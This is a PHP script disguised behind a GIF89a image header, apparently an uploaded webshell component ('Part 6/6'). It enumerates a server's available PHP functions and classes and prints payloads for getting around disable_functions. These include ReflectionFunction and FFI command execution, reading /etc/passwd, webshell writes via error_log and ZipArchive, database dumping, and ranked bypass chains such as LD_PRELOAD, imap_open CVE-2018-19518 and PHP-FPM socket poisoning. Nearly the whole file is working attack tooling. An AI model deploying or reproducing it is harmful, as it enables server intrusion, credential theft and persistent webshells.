GIF89a;
<?php
error_reporting(0);
$d = array_map('trim', explode(',', ini_get('disable_functions')));
function ok($f){ global $d; return function_exists($f) && !in_array($f,$d); }
function cl($c){ return class_exists($c); }
$o = '';

$o .= "============================================================\n";
$o .= "  PART 6/6 - OOP Classes + Bypass Strategy Summary\n";
$o .= "============================================================\n\n";

$o .= "====== 12. OOP & Class-based Attacks [HIGH] ======\n";
$o .= "Classes are NOT blocked by disable_functions!\n";
$o .= "Even if system() is disabled, ReflectionFunction can still call it\n\n";

$classes = array(
    'ReflectionFunction' => array(
        "\$f=new ReflectionFunction('system'); \$f->invoke('id');",
        'Call ANY function via reflection - bypasses disable_functions check!',
        'PHP Core (always available)'
    ),
    'Imagick' => array(
        "// MVG delegate injection for command execution\n           // Create MVG file with: fill 'url(x\"|cmd>out\")'",
        'ImageMagick - MVG/delegate injection or LD_PRELOAD via delegates',
        'php-imagick extension'
    ),
    'FFI' => array(
        "\$ffi=FFI::cdef('int system(const char*);');\n           \$ffi->system('id > /tmp/out.txt');\n           echo file_get_contents('/tmp/out.txt');",
        'Foreign Function Interface - DIRECT C SYSTEM CALLS! PHP 7.4+ only',
        'PHP 7.4+ with ffi.enable=true'
    ),
    'SplFileObject' => array(
        "\$f=new SplFileObject('/etc/passwd');\n           while(!\$f->eof()) echo \$f->fgets();",
        'OOP file reading - alternative to file_get_contents',
        'SPL (always available)'
    ),
    'DirectoryIterator' => array(
        "\$it=new DirectoryIterator('glob:///v??/run/*');\n           foreach(\$it as \$f) echo \$f.\"\\n\";",
        'Directory listing + glob:// for open_basedir bypass!',
        'SPL (always available)'
    ),
    'RecursiveDirectoryIterator' => array(
        "\$path=realpath('/var/www');\n           \$dir=new RecursiveDirectoryIterator(\$path);\n           \$iter=new RecursiveIteratorIterator(\$dir);\n           foreach(\$iter as \$file) echo \$file->getPathname().\"\\n\";",
        'Recursive file search - like find command',
        'SPL (always available)'
    ),
    'GlobIterator' => array(
        "\$it=new GlobIterator('/home/*/flag*');\n           foreach(\$it as \$f) echo \$f.\"\\n\";",
        'Glob pattern file search - find files by pattern',
        'SPL (always available)'
    ),
    'ZipArchive' => array(
        "\$z=new ZipArchive();\n           \$z->open('shell.zip'); \$z->extractTo('/var/www/html/');",
        'Extract archives - write webshell from uploaded zip',
        'php-zip extension'
    ),
    'PDO' => array(
        "\$db=new PDO('mysql:host=localhost;dbname=app','root','pass');\n           \$r=\$db->query('SELECT * FROM users'); print_r(\$r->fetchAll());",
        'Database connection - dump data, read creds',
        'php-pdo extension'
    ),
    'SQLite3' => array(
        "\$db=new SQLite3('/tmp/test.db');\n           // Potential for UDF loading",
        'SQLite - can load UDFs for code execution',
        'php-sqlite3 extension'
    ),
    'SimpleXMLElement' => array(
        "// XXE: new SimpleXMLElement(\$xml, LIBXML_NOENT)",
        'XML parsing - XXE injection if user controls XML input',
        'php-xml extension'
    ),
    'DOMDocument' => array(
        "// XXE: \$doc=new DOMDocument(); \$doc->loadXML(\$xml);",
        'DOM XML parsing - another XXE vector',
        'php-xml extension'
    ),
);

$cls_available = 0;
foreach ($classes as $c => $info) {
    $s = cl($c) ? "[+] AVAILABLE" : "[-] not loaded";
    $o .= "  $s  $c\n";
    $o .= "           {$info[1]}\n";
    $o .= "           Requires: {$info[2]}\n";
    if (cl($c)) {
        $o .= "           Payload:\n           {$info[0]}\n";
        $cls_available++;
    }
    $o .= "\n";
}
$o .= "  Classes available: $cls_available/" . count($classes) . "\n";


// ============================================================
// BYPASS STRATEGY SUMMARY
// ============================================================
$o .= "\n\n";
$o .= "============================================================\n";
$o .= "  BYPASS STRATEGY SUMMARY\n";
$o .= "============================================================\n\n";

$strats = 0;

// 1. Direct RCE
$rce = array();
foreach (array('system','exec','shell_exec','passthru','popen','proc_open','pcntl_exec') as $f)
    if (ok($f)) $rce[] = $f;
if ($rce) {
    $o .= "[CRITICAL] 1. Direct RCE\n";
    $o .= "   Functions: " . implode(', ',$rce) . "\n";
    $o .= "   Action: Use directly! Example: " . $rce[0] . "('id');\n\n";
    $strats++;
}

// 2. LD_PRELOAD
if (ok('putenv')) {
    $t = array();
    foreach (array('mail','mb_send_mail','error_log','imap_mail','gnupg_init','libvirt_connect','syslog') as $f)
        if (ok($f)) $t[] = $f;
    if ($t) {
        $o .= "[CRITICAL] 2. LD_PRELOAD Bypass\n";
        $o .= "   Chain: putenv + " . implode(' / ',$t) . "\n";
        $o .= "   Tool: Chankro3 (github.com/richardschwabe/chankro3)\n";
        $o .= "   Steps: Compile evil.so -> Upload -> Trigger via " . $t[0] . "()\n\n";
        $strats++;
    }
}

// 3. imap_open
if (ok('imap_open')) {
    $o .= "[CRITICAL] 3. imap_open CVE-2018-19518\n";
    $o .= "   ProxyCommand injection via SSH pre-auth\n";
    $o .= "   Metasploit: exploit/linux/http/php_imap_open_rce\n\n";
    $strats++;
}

// 4. FFI
if (cl('FFI')) {
    $o .= "[CRITICAL] 4. FFI Direct Syscall\n";
    $o .= "   FFI::cdef('int system(const char*);') -> direct C call\n";
    $o .= "   No disable_functions bypass needed!\n\n";
    $strats++;
}

// 5. Imagick
if (cl('Imagick')) {
    $o .= "[HIGH] 5. Imagick Delegate/MVG Injection\n";
    $o .= "   MVG file with command injection in URL handler\n";
    $o .= "   Or LD_PRELOAD via Imagick delegate processing\n\n";
    $strats++;
}

// 6. ReflectionFunction
if (cl('ReflectionFunction') && $rce) {
    $o .= "[HIGH] 6. ReflectionFunction\n";
    $o .= "   \$f=new ReflectionFunction('" . $rce[0] . "'); \$f->invoke('id');\n\n";
    $strats++;
}

// 7. error_log file write
if (ok('error_log')) {
    $o .= "[HIGH] 7. error_log File Writer\n";
    $o .= "   error_log('<?php...?>',3,'/path/shell.php')\n";
    $o .= "   Write webshell to ANY writable path!\n\n";
    $strats++;
}

// 8. PHP-FPM
$fpm = array();
foreach (array('fsockopen','stream_socket_client') as $f) if (ok($f)) $fpm[] = $f;
if ($fpm && ok('fwrite')) {
    $o .= "[HIGH] 8. PHP-FPM Socket Poisoning\n";
    $o .= "   " . implode('/',$fpm) . " + fwrite -> Poison FPM unix socket\n";
    $o .= "   Tool: Gopherus (generates FastCGI payload)\n\n";
    $strats++;
}

// 9. File Read
$fr = array();
foreach (array('file_get_contents','scandir','glob','highlight_file','readfile','show_source') as $f)
    if (ok($f)) $fr[] = $f;
if ($fr) {
    $o .= "[HIGH] 9. File Read\n";
    $o .= "   Functions: " . implode(', ',$fr) . "\n";
    $o .= "   Read: /etc/passwd, configs, .env, source code, SSH keys, flags\n\n";
    $strats++;
}

// 10. File Write
$fw = array();
foreach (array('file_put_contents','fwrite','copy','symlink','error_log','rename') as $f)
    if (ok($f)) $fw[] = $f;
if ($fw) {
    $o .= "[HIGH] 10. File Write\n";
    $o .= "   Functions: " . implode(', ',$fw) . "\n";
    $o .= "   Write webshell, .htaccess, symlinks to protected files\n\n";
    $strats++;
}

// 11. Network
$net = array();
foreach (array('fsockopen','stream_socket_client','dns_get_record') as $f)
    if (ok($f)) $net[] = $f;
if ($net) {
    $o .= "[MEDIUM] 11. Network Access\n";
    $o .= "   Functions: " . implode(', ',$net) . "\n";
    $o .= "   Reverse shells, SSRF, DNS exfiltration\n\n";
    $strats++;
}

if ($strats == 0) {
    $o .= "[!] No obvious bypass found. Try:\n";
    $o .= "    - PHP version-specific memory exploits (UAF)\n";
    $o .= "    - /proc/self/mem write\n";
    $o .= "    - mod_cgi bypass (.htaccess + CGI script)\n";
    $o .= "    - PHP Perl Extension\n";
    $o .= "    - Check: github.com/mm0r1/exploits\n";
}

$o .= "\n============================================================\n";
$o .= "  Total bypass strategies found: $strats\n";
$o .= "============================================================\n";

file_put_contents('/tmp/_audit_p6.txt', $o);
header('Content-Type: text/plain; charset=utf-8');
echo $o;
echo "\n[*] Part 6/6 saved to /tmp/_audit_p6.txt\n";
?>
